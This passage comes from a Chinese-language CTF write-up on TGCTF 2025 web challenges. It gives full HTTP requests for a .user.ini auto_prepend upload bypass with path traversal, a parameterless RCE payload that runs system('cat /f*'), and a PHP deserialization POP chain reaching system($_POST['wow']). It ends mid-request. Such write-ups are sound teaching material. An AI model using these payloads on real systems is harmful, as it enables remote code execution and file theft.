data-language=\"http\"><code class=\"language-http\"><span class=\"token request-line\"><span class=\"token method property\">POST</span> <span class=\"token request-target url\">/upload.php?name=../evil.png</span> <span class=\"token http-version property\">HTTP/1.1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">node1.tgctf.woooo.tech:32690</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Length</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">320</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Cache-Control</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">max-age=0</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">zh-CN,zh;q=0.9</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Origin</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">http://node1.tgctf.woooo.tech:32690</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">multipart/form-data; boundary=----WebKitFormBoundary76S3hC5Gh3B7j6KZ</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Upgrade-Insecure-Requests</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">User-Agent</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Referer</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">http://node1.tgctf.woooo.tech:32690/</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate, br</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Connection</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">keep-alive</span></span>\n\n------WebKitFormBoundary76S3hC5Gh3B7j6KZ\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Disposition</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">form-data; name=\"name\"; filename=\"1.png\"</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">application/octet-stream</span></span>\n\n&lt;?php phpinfo();?>\n\n\n------WebKitFormBoundary76S3hC5Gh3B7j6KZ\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Disposition</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">form-data; name=\"submit\"</span></span>\n\n上传文件\n------WebKitFormBoundary76S3hC5Gh3B7j6KZ--\n<span class=\"token request-line\"><span class=\"token method property\">POST</span> <span class=\"token request-target url\">/upload.php?name=../.user.ini</span> <span class=\"token http-version property\">HTTP/1.1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">node1.tgctf.woooo.tech:32690</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Length</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">335</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Cache-Control</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">max-age=0</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">zh-CN,zh;q=0.9</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Origin</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">http://node1.tgctf.woooo.tech:32690</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">multipart/form-data; boundary=----WebKitFormBoundary76S3hC5Gh3B7j6KZ</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Upgrade-Insecure-Requests</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">User-Agent</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Referer</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">http://node1.tgctf.woooo.tech:32690/</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate, br</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Connection</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">keep-alive</span></span>\n\n------WebKitFormBoundary76S3hC5Gh3B7j6KZ\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Disposition</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">form-data; name=\"name\"; filename=\".user.ini\"</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">application/octet-stream</span></span>\n\nauto_prepend_file=evil.png\n\n------WebKitFormBoundary76S3hC5Gh3B7j6KZ\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Disposition</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">form-data; name=\"submit\"</span></span>\n\n上传文件\n------WebKitFormBoundary76S3hC5Gh3B7j6KZ--</code></pre>\n\n<p>在phpinfo的$_SERVER[‘FLAG’]里看到flag</p>\n<h3 id=\"AAA偷渡阴平\"><a href=\"#AAA偷渡阴平\" class=\"headerlink\" title=\"AAA偷渡阴平\"></a>AAA偷渡阴平</h3><p>无参数RCE绕过。</p>\n<p>payload：</p>\n<pre class=\"language-http\" data-language=\"http\"><code class=\"language-http\">GET /?tgctf2025=eval(end(current(get_defined_vars())));&amp;b=system('cat /f*'); HTTP/1.1\n<span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">node1.tgctf.woooo.tech:30815</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">zh-CN,zh;q=0.9</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Upgrade-Insecure-Requests</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">User-Agent</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">CUIASDGHFIOUWE</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">123123</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate, br</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Connection</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">keep-alive</span></span></code></pre>\n\n<h3 id=\"什么文件上传？\"><a href=\"#什么文件上传？\" class=\"headerlink\" title=\"什么文件上传？\"></a>什么文件上传？</h3><p>robots.txt 进去有 class.php 一眼就能瞪出来pop链子。</p>\n<pre class=\"language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">yesterday</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$learn</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$study</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"study\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$try</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">learn</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"learn&lt;br>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"You studied hard yesterday.&lt;br>\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">study</span><span class=\"token operator\">-></span><span class=\"token function\">hard</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">today</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$doing</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$did</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$done</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">did</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"What you did makes you outstanding.&lt;br>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__call</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$arg1</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$arg2</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">done</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"And what you've done has given you a choice.&lt;br>\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">done</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token function\">md5</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">doing</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">==</span><span class=\"token number\">666</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token function\">doing</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">doing</span><span class=\"token operator\">-></span><span class=\"token property\">better</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">tommoraw</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$good</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$bad</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$soso</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__invoke</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">good</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"You'll be good tommoraw!&lt;br>\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">good</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__get</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$arg1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">bad</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"You'll be bad tommoraw!&lt;br>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">future</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$impossible</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"How can you get here?&lt;br>\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$out</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$no</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$useful1</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful2</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful3</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful4</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful5</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful6</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful7</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful8</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful9</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful10</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful11</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful12</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful13</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful14</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful15</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful16</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful17</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful18</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful19</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">public</span> <span class=\"token variable\">$useful20</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__set</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$arg1</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$arg2</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">out</span><span class=\"token operator\">-></span><span class=\"token property\">useful7</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Seven is my lucky number&lt;br>\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'whoami'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"This is your future.&lt;br>\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"wow\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token string double-quoted-string\">\"win\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">no</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"no\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">no</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$evil</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">yesterday</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$evil</span> <span class=\"token operator\">-></span> <span class=\"token property\">study</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">today</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$evil</span> <span class=\"token operator\">-></span> <span class=\"token property\">study</span> <span class=\"token operator\">-></span> <span class=\"token property\">doing</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">future</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></span></code></pre>\n\n<p>随后序列化evil。base64四次。随后上传文件通过file_exists的检查即可。</p>\n<pre class=\"language-http\" data-language=\"http\"><code class=\"language-http\"><span class=\"token request-line\"><span class=\"token method property\">POST</span> <span class=\"token request-target url\">/upload.php</span> <span class=\"token http-version property\">HTTP/1.1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Host</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">node1.tgctf.woooo.tech:32439</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Length</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">5437</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Cache-Control</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">max-age=0</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Language</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">zh-CN,zh;q=0.9</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Origin</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">http://node1.tgctf.woooo.tech:32439</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Type</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">multipart/form-data; boundary=----WebKitFormBoundaryurqPJUpE3whNwI5B</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Upgrade-Insecure-Requests</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">1</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">User-Agent</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Referer</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">http://node1.tgctf.woooo.tech:32439/</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Accept-Encoding</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">gzip, deflate, br</span></span>\n<span class=\"token header\"><span class=\"token header-name keyword\">Connection</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">keep-alive</span></span>\n\n------WebKitFormBoundaryurqPJUpE3whNwI5B\n<span class=\"token header\"><span class=\"token header-name keyword\">Content-Disposition</span><span class=\"token punctuation\">:</span> <span class=\"token header-value\">form-data; name=\"Vm10b2QyUnJOVlpQV0VKVVlXeGFhRll3VlRCa01XUnpZVVYwYUUxWGVGcFpWRXB6VlVkR2NrMUVTbUZXUlRWUFZHMXpNVlpYU1hsaVIyeFRUVlp3ZGxkVVNYZE5SMFpXVDBod1ZWWkdjRkZXYTJNMVkwWnNjbHBHWkdoU01EVXdWR3RTYjFkdFNuSmhNMHBVVmpOQmQxcFhjelZqVmxwVlYydHdhV0Y2VWpOWGExcHJWVEExVm1KSVJtdFNhMHBSV1ZkNFZrMXNUbGhPVms1cllraENTVlZ0Y0ZkVGJVWjBUMVJhVlUxcVZYZGFWM00xWTFaYVZWZHJjR2xXYTI5NVYxWmFhazFYU25KaVNFWnJVbXRLVVZsWGVISk5iRTVZVFZkR1RsWXhTa3BXYlRWeldWWlZkMkY2U2xWV00wSlBWRzB4Vm1Wc1VsVlhhelZYVWpKTmVWVXhaR3RSTWtwWVZXeHNWbUZyV25GWmJGcFhVV3hzVjFremFHdE5hMncyVmtjMWQyRkdXWGRqU0hCWVlrVTFTMVJxU2s5T2JVbDZZa1U1VjFKNmJIZFdWRUpxVGxVd2QySkZhRlZpVjJod1dWWldTazFXYkhGVWJGcGhUVmM1TlZadGNFTlRiRWw1WVVoT1drMXFSbGRVUkVaRFUwWk9kV0pHUm1oV1YzTjZWMVJPZDJSdFZrWk5WbFpwVFcxNFExVnFSblpsUm5CR1lVWmtiRlp1UWxOVlZ6VmhZVEZrUjFKdVFsVmxhMFYzVkdwS1QwNXRTWHBoUlRWVFVucHNkMVZXVm10WlZURllWV3RzVjJKdGVHaFdWbFpMVFZac2RXSkZjRTlOVmtwNFdrVm9kMVZIUm5SVVZFcFVWbnBXV0ZwWGVIZFhSbVJ4VW0xc1UxSldXbmRXU0hCQ1RVVTBlVlJxV21sbGF6VlJXVlpXZG1WR2JEWlRiR1JwVmpGS1dWcEVUbk5UYlVaMVZXeENWV1ZyTlU5VWJYTXhUbTFKZVdKSGRGaFNWRlo2VmpJd01WWXlUWGROVkZaVVZrZFNWbGxYTlZOT2JGRjVZMGR3VDJFeWVERldiVFYzV1ZaWmVHSXphRnBoTVVwVFdWWlZOR1F3TlVWYVIzQnNZbFJvTmxaRVNuTlRNREZZVkZoc1YySlVSbkpXYWs1cVpVWk9XR05FUWxWTlJHZzJWa1pTWVZReVZuUlBXRUpoVW0xb1VGbHJXbmRrVmxwMVZHczVhRlpYYzNwV2EyUjNUVWRXY2s5WVJscGxiSEJMV1cxNFlVNXNaSE5hUjBaT1ZqQndSbGRVU25OVlJURkZWVlJPV2swelFqSlVWRUUxWTBaT2NWSnRjRTVpUm5Bd1YydGFhMDB3TlVaaVNFWnJVbFJzVVZSVVFYZE5iRkoxWTBoYWFGWXhTbHBXUnpFMFdWZEtjMWR1Y0ZWTlZUVkxWR3BHVTJOWFVrbGpSa0pvWWxkTmVWVXhZekZXTWxaelkwWm9XR0ZyV25CVmExWlhUVEZPV0dORVFsVk5SR2cyVmtaU1lWVkdTa2hQV0VKaFVtMW9VRmxyV25ka1ZscDFWR3MxVjFKV1duZFdTSEJDVFVVMGVWUnFXbWxsYkVwUldWWldkbVZHYkRaVGJHUnBWakZLV1ZwRVRtOVViVVpXWVhwT1YxSXpRWGRhVjNNMVkxWndObGRyY0dsaVJtOHlWako0YTFsVk1WaFRhMVpUVjBoQ1MxbFhOVk5WUmxJMlZHczFUMkY2YkVaWmFrcHpZVEZrUms1WVRsaGlWRlpZV1hwQmVGWldWbGhpUmtKT1VrWkZlbGRVVG5ka2F6VkdUMWhDVkdGclduRlVWM2hoWkVad1IxcEVUbXhTVkZaVlZURlNhMVpYUm5WVmFscFZUVzVDZFZSdGRITmtWbHAxWTBkR1YwMVhPVFJYVjNSVFVtc3hjbUpJUm10U1ZHeFJWRlJCZDAxc1VYZFZibHBvVmpGS1dsWkhNVFJaVjBwelYyNXdWVlpzU25GWlZsVTBaREExUlZwSGNHeGlWR2QzVmtSS2MxTXdNVmhVV0d4WFlsUkdjbFpxVG10T1JsRjNWR3R3VDAxV1NuaGFSV2gzVlVkR2RGbDZTbFJXZWxaWVdsZDRkMWRHWkhGU2JXeFRVbFpWZUZVeFpIZE5SbEYzVDBod1ZWWkdjRkZWYTJNMVkwWndSMkZGT1dsU2JrSXhWbTAxVDFSdFJuSlNia0pWWld0RmQxUnFTbUZYVmxKVlYyczFiR0pVYkhkV01uUnJZekpGZDJKSVJtdFRTRUpSV1ZkemQwMVdVWGxpUlhSWVVqQmFTVlZ0Y0VOVGJFNUlaVVJLWVZKck5VUlpWRXBIVjBaV1dGcEhiRmROUm5BMVZqSjRiMVJzYjNsV2JHaFFWa1ZhUzFWdWNISmxSbkJHWVVVNVRsSnRlRmxVYkdRd1lVWmFObFp1VmxWU00wRXdXVlprVDJOVk5VaGlSa0pPVFVSQmVWWkhkRk5rYlVaWFkwVm9VRmRHV21oV1ZFSnlUVEZhU0dORVFsQldNRFF5V1dwT2QxVkhSbFppTTJSYVRXcFdlVmxXVlRSa01EVkZXa2N4VmxaRVFUVT0=.txt\"; 